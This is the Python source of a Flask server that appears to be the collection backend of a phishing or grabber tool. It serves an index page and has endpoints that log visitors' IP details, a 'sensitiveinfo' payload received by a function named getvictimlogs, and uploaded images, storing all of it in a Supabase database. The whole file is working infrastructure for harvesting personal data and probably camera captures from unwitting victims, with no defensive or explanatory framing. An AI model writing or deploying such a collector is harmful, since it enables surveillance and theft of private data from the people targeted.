from supabase import create_client
from colorama import Fore, Back, Style
from flask import Flask, request, jsonify, Response
from datetime import datetime
import time
import os
import logging

# Create image folder if not exists
if not os.path.exists('image'):
    os.mkdir('image')

PATH_TO_IMAGES_DIR = 'image'

app = Flask(__name__)

SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_SERVICE_KEY")

supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/')
def index():
    return Response(open('index.html').read(), mimetype="text/html")

def save_to_db(payload):
    supabase.table("logs").insert({
        "data": payload,
        "created_at": datetime.utcnow().isoformat()
    }).execute()

@app.route('/ipinfo', methods=['POST'])
def ipinfos():
    iplogs = request.get_json()

    save_to_db({
        "type": "ipinfo",
        "data": iplogs
    })

    return jsonify({'processed': 'true'})

@app.route('/process_qtc', methods=['POST'])
def getvictimlogs():
    logs = request.get_json()

    save_to_db({
        "type": "sensitiveinfo",
        "data": logs
    })

    return jsonify({'processed': 'true'})

@app.route('/image', methods=['POST'])
def image():
    i = request.files['image']
    f = '%s.jpeg' % time.strftime("%Y%m%d-%H%M%S")
    i.save('%s/%s' % (PATH_TO_IMAGES_DIR, f))

    save_to_db({
        "type": "image",
        "filename": f
    })

    return Response("%s saved" % f)

if __name__ == "__main__":
    app.run(debug=False, host='0.0.0.0', port=8080)